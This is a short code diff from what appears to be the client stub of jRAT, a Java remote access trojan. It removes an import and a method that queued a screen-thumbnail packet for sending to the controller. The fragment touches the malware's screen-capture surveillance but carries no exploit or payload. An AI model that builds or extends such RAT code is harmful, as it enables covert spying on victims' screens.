@@ -17,7 +17,6 @@ import javax.imageio.ImageIO;
 import se.jrat.common.utils.ImageUtils;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet26RemoteScreen;
-import se.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import se.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
 import se.jrat.stub.utils.ScreenUtils;
 
@@ -177,14 +176,6 @@ public class Screen extends Thread {
 		}
 		
 		return b;
-	}
-
-	public static void sendThumbnail(Connection con) {
-		try {
-			con.addToSendQueue(new Packet33Thumbnail());
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
 	}
 
 	public int getImageSize() {
